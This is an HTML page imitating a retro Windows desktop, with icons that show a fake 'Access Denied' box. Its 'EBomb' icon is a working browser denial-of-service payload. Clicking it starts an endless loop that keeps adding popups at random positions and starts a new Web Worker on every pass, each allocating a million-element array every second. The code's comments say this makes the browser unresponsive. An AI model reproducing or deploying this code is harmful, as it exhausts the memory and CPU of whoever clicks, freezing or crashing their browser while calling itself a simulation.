<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Old School Desktop</title>
</head>

<style>
  /* Basic Reset */
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    height: 100%;
    overflow: hidden;
    background-color: #87CEEB;
  }

  /* Full-screen Desktop container */
  .desktop {
    width: 100vw;
    height: 100vh;
    background-color: #C0C0C0;
    border: 5px solid #000;
    position: relative;
    display: flex;
    flex-direction: column;
    background-image: url('https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwallpaperaccess.com%2Ffull%2F1536061.jpg&f=1&nofb=1&ipt=829511ba4decd8bc4490a43e4c7c6c1cef3ae88e8bb7e3502e13b686cb70384b&ipo=images');
    background-size: cover;
  }

  .start-menu {
    font-weight: bold;
    cursor: pointer;
  }

  .clock {
    font-size: 14px;
  }

  /* Desktop Background */
  .desktop-background {
    display: flex;
    flex-wrap: wrap;
    justify-content: start;
    padding: 20px;
    gap: 20px;
    position: absolute;
    top: 10px;
    left: 10px;
  }

  /* Icons */
  .icon {
    text-align: center;
    width: 70px;
  }

  .icon img {
    width: 50px;
    height: 50px;
    cursor: pointer;
  }

  .icon p {
    font-size: 12px;
    margin-top: 5px;
    color: black;
  }

  /* Popup Window */
  .popup {
    display: none;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 300px;
    height: 200px;
    background-color: white;
    border: 2px solid #000;
    padding: 10px;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
  }

  .popup h2 {
    text-align: center;
    font-size: 18px;
  }

  .popup p {
    font-size: 14px;
    text-align: center;
  }

  .popup button {
    display: block;
    margin: 10px auto;
    padding: 5px 10px;
    background-color: #2F4F4F;
    color: white;
    border: none;
    cursor: pointer;
  }

  .popup button:hover {
    background-color: #444;
  }

  /* Live Clock */
  .clock-container {
    position: absolute;
    bottom: 10px;
    right: 10px;
    font-size: 16px;
    font-weight: bold;
    color: black;
    background-color: rgba(255, 255, 255, 0.7);
    padding: 5px 10px;
    border-radius: 5px;
  }

</style>

<body>
  <div class="desktop">
    <div class="desktop-background">
      <div class="icon">
        <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fvectorified.com%2Fimages%2Fwindows-xp-my-computer-icon-11.png&f=1&nofb=1&ipt=c26798939ba4920290abb1e94d1a8e130358fdee8ec67cc4cb99f50b6009852d&ipo=images" alt="Icon">
        <p>My Computer</p>
      </div>
      <div class="icon">
        <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwindows-xp-desktop.netlify.app%2Fassets%2Fmy_documents_icon.png&f=1&nofb=1&ipt=5bfdbe730f3face962c186dcc83add2b66ed4b06aec7466d77b303e9dd462e74&ipo=images" alt="Icon">
        <p>Documents</p>
      </div>
      <div class="icon">
        <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Flogodix.com%2Flogo%2F49412.png&f=1&nofb=1&ipt=790035a4a6e9c32f42d3d75797e36b5481a811c248f601d640b68bf8214d564f&ipo=images" alt="Icon">
        <p>Internet</p>
      </div>
      <!-- New ebomb Icon -->
      <div class="icon" id="ebomb-icon">
        <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fpngimg.com%2Fuploads%2Fbomb%2Fbomb_PNG5.png&f=1&nofb=1&ipt=c53e4edafdab4f360c36f4344eb9276d39dc0c1f095c63bd0a2be02a16942a7b&ipo=images" alt="ebomb">
        <p>EBomb</p>
      </div>
    </div>

    <!-- Popup Window -->
    <div class="popup" id="popup">
      <h2>EBomb Activated</h2>
      <p>Warning: This is a simulated EBomb!</p>
      <button id="close-popup">Close</button>
    </div>

  </div>


  <script>
    // Get the ebomb icon and popup elements
    const ebombIcon = document.getElementById('ebomb-icon');
    const popup = document.getElementById('popup');
    const closePopupButton = document.getElementById('close-popup');

    globalThis.popupCounter = 0;
    // Show the popup when the ebomb icon is clicked
    ebombIcon.addEventListener('click', async() => {
        while (true) {
            popup.style.display = 'block';
            // Increment the counter
            globalThis.popupCounter++;
            console.log(globalThis.popupCounter);
            // create a new popup element with the counter value
            const newPopup = document.createElement('div');
            newPopup.innerHTML = `<h2>EBomb Activated</h2><p>Warning: This is a simulated EBomb! ${globalThis.popupCounter}</p>`
            // make the new popup appear at a random position
            newPopup.style.position = 'absolute';
            newPopup.style.top = `${Math.random() * 100}vh`;
            newPopup.style.left = `${Math.random() * 100}vw`;
            newPopup.style.backgroundColor = 'white';
            newPopup.style.border = '2px solid #000';
            newPopup.style.padding = '10px';
            newPopup.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.1)';
            document.body.appendChild(newPopup);

            // force the browser to re-render the page
            newPopup.style.display = 'none';
            newPopup.offsetHeight;
            newPopup.style.display = 'block';

            // sleep for a bit before creating the next popup
            // 0 < x < 500ms
            const sleepTime = Math.random() * 2;
            await new Promise(resolve => setTimeout(resolve, sleepTime));

            // spwan a new task for every popup that consumes a lot
            // of memory and CPU make sure that each task spawned
            // is independent and runs concurrently
            // this will make the browser unresponsive

            new Worker(URL.createObjectURL(new Blob([`
                setInterval(() => {
                    const arr = new Array(1000000).fill('ðŸš€');
                    console.log(arr);
                }, 1000);
            `])));
        }
    });

    // Close the popup when the "Close" button is clicked
    closePopupButton.addEventListener('click', () => {
      popup.style.display = 'none';
    });
  </script>

  <script>
    function showRestrictedAccessPopup() {
      // Create popup container
      const accessPopup = document.createElement('div');
      accessPopup.style.position = 'fixed';
      accessPopup.style.top = '0';
      accessPopup.style.left = '0';
      accessPopup.style.width = '100%';
      accessPopup.style.height = '100%';
      accessPopup.style.backgroundColor = 'rgba(0, 0, 0, 0.5)'; // Add semi-transparent background
      accessPopup.style.display = 'flex';
      accessPopup.style.justifyContent = 'center';
      accessPopup.style.alignItems = 'center';
      accessPopup.style.zIndex = '1000'; // Ensure it's on top
  
      // Add popup content
      accessPopup.innerHTML = `
        <div style="
          position: relative; 
          width: 400px; 
          font-family: Tahoma, sans-serif;
          background-color: #cfe7fc;
          border: 1px solid #a0c4e6;
          box-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);"
        >
          <div style="
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            background-color: #004e98; 
            color: white; 
            padding: 5px; 
            font-size: 14px; 
            font-weight: bold;"
          >
            <span>Access Popup</span>
            <button style="
              background: transparent; 
              border: none; 
              color: white; 
              font-size: 16px; 
              cursor: pointer; 
              outline: none;
              padding: 0;
              margin: 0;"
              onclick="this.closest('div').parentElement.remove();"
            >&times;</button>
          </div>
          <div style="padding: 20px; text-align: center;">
            <h2 style="
              color: red; 
              margin: 20px 0; 
              text-shadow: 1px 1px #ffffff;">Access Denied</h2>
            <p style="
              margin-top: 10px; 
              color: #333333;">You don't have access to open this. Contact your administrator.</p>
          </div>
        </div>
      `;
  
      // Append popup to body
      document.body.appendChild(accessPopup);
    }
  
    // Event listeners for icons
    document.querySelectorAll('.icon img').forEach(icon => {
      if (icon.alt === "Icon") { // Adjust this if needed
        icon.addEventListener('click', showRestrictedAccessPopup);
      }
    });
  </script>

</body>
</html>
